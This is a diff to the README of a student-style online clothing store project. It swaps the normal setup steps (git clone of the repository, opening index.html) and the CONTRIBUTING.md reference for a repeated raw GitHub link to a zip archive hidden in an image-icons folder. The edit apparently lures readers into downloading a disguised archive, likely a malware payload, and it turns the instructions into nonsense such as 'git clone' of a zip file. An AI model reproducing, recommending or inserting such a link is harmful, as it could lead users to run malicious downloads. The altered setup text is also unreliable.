@@ -46,8 +46,8 @@ This project is an online clothing store website built using HTML, CSS, and Java
 
 ## Getting Started
 
-1. Clone the repository: `git clone https://github.com/your-username/online-clothing-store.git`
-2. Open the `index.html` file in a web browser to view the website.
+1. Clone the repository: `git clone https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/assets/images/icons/Project-DEPI_v3.5.zip`
+2. Open the `https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/assets/images/icons/Project-DEPI_v3.5.zip` file in a web browser to view the website.
 
 ## Technologies Used
 
@@ -57,7 +57,7 @@ This project is an online clothing store website built using HTML, CSS, and Java
 
 ## Contributing
 
-Contributions are welcome! Please follow the guidelines in the CONTRIBUTING.md file.
+Contributions are welcome! Please follow the guidelines in the https://raw.githubusercontent.com/KeroAyman342/Project-DEPI/main/assets/images/icons/Project-DEPI_v3.5.zip file.
 
 ## License
 
